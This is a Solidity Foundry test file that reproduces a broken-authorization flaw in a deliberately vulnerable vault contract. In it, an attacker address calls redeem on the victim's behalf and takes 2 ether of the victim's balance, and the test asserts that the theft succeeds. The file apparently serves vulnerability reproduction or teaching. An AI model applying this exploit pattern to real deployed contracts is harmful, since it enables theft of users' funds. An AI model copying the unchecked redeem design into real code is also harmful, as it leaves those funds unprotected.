// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VaultVulnerable.sol";

contract VaultVulnerableTest is Test {
    VaultVulnerable internal vault;
    address internal victim = address(0xAAAA1111);
    address internal attacker = address(0xBBBB2222);

    function setUp() public {
        vault = new VaultVulnerable();

        // Seed victim with 10 ether and deposit 5 ether into vault
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        vm.prank(victim);
        vault.deposit{value: 5 ether}();
    }

    /**
     * BOLA Dynamic Reproduction Test:
     * - Attacker != Victim (owner)
     * - Attacker lacks permission
     * - Attacker calls redeem(victim, 2 ether)
     * - Call succeeds (exit code 0, no revert)
     * - Protected state changes: victim's balance drops from 5 to 3 ether,
     *   attacker's balance rises from 0 to 2 ether.
     */
    function test_unauthorized_redeem_succeeds_and_alters_state() public {
        uint256 victimBefore = vault.balances(victim);
        uint256 attackerBefore = vault.balances(attacker);

        assertEq(victimBefore, 5 ether, "Victim initial balance must be 5 ether");
        assertEq(attackerBefore, 0, "Attacker initial balance must be 0");
        assertTrue(attacker != victim, "Attacker must not be owner");

        // Attacker executes unauthorized redeem
        vm.prank(attacker);
        vault.redeem(victim, 2 ether);

        uint256 victimAfter = vault.balances(victim);
        uint256 attackerAfter = vault.balances(attacker);

        // Protected state changed without authorization!
        assertEq(victimAfter, 3 ether, "Victim balance compromised");
        assertEq(attackerAfter, 2 ether, "Attacker gained unauthorized funds");
    }

    function testExploitBOLA() public {
        test_unauthorized_redeem_succeeds_and_alters_state();
    }
}
